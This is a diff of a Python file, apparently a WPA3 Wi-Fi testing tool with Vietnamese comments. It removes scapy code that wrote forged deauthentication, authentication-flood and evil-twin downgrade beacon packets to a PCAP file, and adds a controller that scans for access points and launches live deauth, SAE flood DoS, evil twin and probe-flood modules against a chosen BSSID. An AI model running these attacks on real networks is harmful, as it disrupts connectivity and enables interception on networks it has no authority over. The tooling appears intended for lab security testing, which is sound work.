@@ -1,67 +1,88 @@
 # src/simulator.py
 import time
 import os
-from scapy.all import (
-    RadioTap, Dot11, Dot11Deauth, Dot11Auth, Dot11Beacon,
-    Dot11Elt, wrpcap
-)
-import random
+import subprocess
+
 class Wpa3AttackSimulator:
-    def __init__(self, target_bssid, client_mac="ff:ff:ff:ff:ff:ff", pcap_file="data/simulated_attack.pcap"):
+    # Đã sửa lại target_bssid thành rỗng mặc định để bắt buộc quét trước
+    def __init__(self, target_bssid="", interface="wlan0", plugin_dir="plugins"):
         self.target_bssid = target_bssid
-        self.client_mac = client_mac
-        self.pcap_file = pcap_file
+        self.interface = interface
+        self.plugin_dir = plugin_dir
+        os.makedirs(self.plugin_dir, exist_ok=True)
+
+    def _run_plugin_safely(self, script_name, args_list):
+        script_path = os.path.join(self.plugin_dir, script_name)
+        if not os.path.exists(script_path):
+            print(f"[-] LỖI AN TOÀN: Không tìm thấy script '{script_name}' trong thư mục '{self.plugin_dir}'.")
+            return False
+
+        print(f"[*] Đang nạp module từ: {script_path}...")
+        command = ["python3", script_path] + args_list
+        try:
+            subprocess.run(command, check=True)
+            return True
+        except subprocess.CalledProcessError as e:
+            print(f"\n[-] MODULE CRASH: Script '{script_name}' đã dừng đột ngột (Mã lỗi: {e.returncode}).")
+            return False
+        except KeyboardInterrupt:
+            print("\n[!] Đã ép dừng module bằng tay.")
+            return False
+
+    # --- BỔ SUNG: HÀM QUÉT MẠNG ---
+    def run_network_scan(self, timeout="15"):
+        print("\n" + "📡" * 20)
+        print(f"[!] KHỞI CHẠY KIỂM THỬ: RÀ QUÉT MẠNG (RECONNAISSANCE)")
+        print(f"[*] Đang quét Beacon frames trên giao diện: {self.interface}")
+        print("📡" * 20)
+        self._run_plugin_safely("ap_scanner.py", [self.interface, str(timeout)])
+        print("\n[+] Trạm điều phối: Hoàn tất quá trình trinh sát. Hãy copy BSSID mục tiêu để khóa.")
+
+    # --- BỔ SUNG: HÀM KHÓA MỤC TIÊU ---
+    def set_target(self, bssid):
+        self.target_bssid = bssid
+        print(f"[+] Đã khóa mục tiêu mới: {self.target_bssid}")
+
+    def run_deauth_test(self, client_mac="ff:ff:ff:ff:ff:ff", count="150"):
+        if not self.target_bssid:
+            print("[-] LỖI: Bạn phải thực hiện Khóa mục tiêu (BSSID) trước khi tấn công!")
+            return
+            
+        print("\n" + "⚔️" * 20)
+        print(f"[!] KHỞI CHẠY KIỂM THỬ: DEAUTHENTICATION ATTACK")
+        print(f"[*] Mục tiêu: {self.target_bssid} | Nạn nhân: {client_mac}")
+        print("⚔️" * 20)
+        self._run_plugin_safely("deauth_test.py", [self.interface, self.target_bssid, client_mac, str(count)])
+        print("\n[+] Trạm điều phối: Đã thu hồi quyền kiểm soát từ module Deauth.")
+
+    def run_sae_dos_test(self, duration_sec="10"):
+        if not self.target_bssid:
+            print("[-] LỖI: Bạn phải thực hiện Khóa mục tiêu (BSSID) trước khi tấn công!")
+            return
+            
+        print("\n" + "🔥" * 20)
+        print(f"[!] KHỞI CHẠY KIỂM THỬ: SAE AUTHENTICATION FLOOD (DoS)")
+        print(f"[*] Mục tiêu: {self.target_bssid} | Thời lượng: {duration_sec}s")
+        print("🔥" * 20)
+        self._run_plugin_safely("sae_dos_test.py", [self.interface, self.target_bssid, str(duration_sec)])
+        print("\n[+] Trạm điều phối: Đã thu hồi quyền kiểm soát từ module DoS.")
+
+    def run_evil_twin_setup(self, target_ssid):
+        print("\n" + "🎭" * 20)
+        print(f"[!] KHỞI CHẠY KIỂM THỬ: EVIL TWIN / DOWNGRADE AP")
+        print(f"[*] Mục tiêu SSID: {target_ssid}")
+        print("🎭" * 20)
+        self._run_plugin_safely("evil_twin_setup.py", [self.interface, target_ssid])
+        print("\n[+] Trạm điều phối: Đã thu hồi quyền kiểm soát từ module Evil Twin.")
         
-        # Xóa file cũ nếu tồn tại
-        if os.path.exists(self.pcap_file):
-            os.remove(self.pcap_file)
-
-def generate_random_mac():
-    return "00:%02x:%02x:%02x:%02x:%02x" % (
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255)
-    )
-
-    def save_packet(self, packet):
-        """Ghi gói tin trực tiếp vào file PCAP"""
-        wrpcap(self.pcap_file, packet, append=True)
-
-    def simulate_deauth(self, count=100):
-        print(f"[*] Tạo {count} gói Deauth vào file PCAP...")
-        for _ in range(count):
-            packet1 = RadioTap() / Dot11(addr1=self.client_mac, addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Deauth(reason=7)
-            self.save_packet(packet1)
-        print(f"[+] Hoàn tất nạp gói Deauth vào {self.pcap_file}")
-
-    def simulate_auth_flood_dos(self, count=300):
-        print(f"[*] Tạo {count} gói DoS Auth Flood vào file PCAP...")
-        for _ in range(count):
-            fake_client = generate_random_mac()
-            packet = (RadioTap() / 
-                      Dot11(addr1=self.target_bssid, addr2=fake_client, addr3=self.target_bssid) / 
-                      Dot11Auth(algo=0, seqnum=1, status=0))
-            self.save_packet(packet)
-        print(f"[+] Hoàn tất nạp gói DDoS Auth vào {self.pcap_file}")
-
-    def simulate_downgrade_evil_twin(self, target_ssid="WPA3_Lab_Network", count=50):
-        print(f"[*] Tạo gói Beacon giả mạo (Evil Twin WPA2) vào file PCAP...")
-        fake_ap_bssid = "00:11:22:33:44:55"
+    def run_probe_flood_test(self, target_ssid, count="100"):
+        """Kịch bản mới: Trinh sát ồn ào (Probe Request Flood)"""
+        print("\n" + "🛰️" * 20)
+        print(f"[!] KHỞI CHẠY KIỂM THỬ: PROBE REQUEST FLOOD")
+        print(f"[*] Mục tiêu tìm kiếm (SSID): {target_ssid}")
+        print("🛰️" * 20)
         
-        essid_el = Dot11Elt(ID="SSID", info=target_ssid)
-        rates_el = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")
-        rsn_wpa2_info = (
-            b"\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00"
-        )
-        rsn_el = Dot11Elt(ID="RSNinfo", info=rsn_wpa2_info)
+        # Gọi file plugin 'probe_flood.py' và truyền 3 tham số: interface, ssid, count
+        self._run_plugin_safely("probe_flood.py", [self.interface, target_ssid, str(count)])
         
-        packet = (RadioTap() / 
-                  Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=fake_ap_bssid, addr3=fake_ap_bssid) / 
-                  Dot11Beacon(cap=0x1104) / 
-                  essid_el / rates_el / rsn_el)
-        
-        for _ in range(count):
-            self.save_packet(packet)
-        print(f"[+] Hoàn tất nạp gói Evil Twin vào {self.pcap_file}")
+        print("\n[+] Trạm điều phối: Đã thu hồi quyền kiểm soát từ module Probe Flood.")
